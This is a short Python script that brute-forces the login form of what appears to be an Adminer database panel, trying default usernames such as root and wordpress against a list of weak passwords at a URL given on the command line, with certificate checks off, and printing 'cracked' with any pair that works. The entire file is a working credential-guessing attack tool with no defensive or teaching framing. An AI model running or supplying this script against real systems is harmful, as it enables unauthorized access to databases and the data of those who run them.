import requests
import sys


def login(url, login, password):
    resp = requests.post(url, data={
        "auth[driver]": "server",
        "auth[server]": "",
        "auth[username]": login,
        "auth[password]": password,
        "auth[db]": ""
    }, verify=False, timeout=5, allow_redirects=True)


    if 'No such file or directory' in resp.text:
        return False
    if 'Too many unsuccessful login' in resp.text:
        return False
    if 'Access denied' in resp.text:
        return False
    if '<h2>Login</h2>' in resp.text:
        return False
    return True

url = sys.argv[1]

logins = [
    "root",
    "user",
    "wordpress"
]

passwords = [
    "root",
    "",
    "user",
    "wordpress",
    "password",
    "pass123",
    "qwerty123"
]

for l in logins:
    for p in passwords:
        if login(url, l, p):
            print('cracked', url, l, p)
            exit(0)

print('failed', url)
